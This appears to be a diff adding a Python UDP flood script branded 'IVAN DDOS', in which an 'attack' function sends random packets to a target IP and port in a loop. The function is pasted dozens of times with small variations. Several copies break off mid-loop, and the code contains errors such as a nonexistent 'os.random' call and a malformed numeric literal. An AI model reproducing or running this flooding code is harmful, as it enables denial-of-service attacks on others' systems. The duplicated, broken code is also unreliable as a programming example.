+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
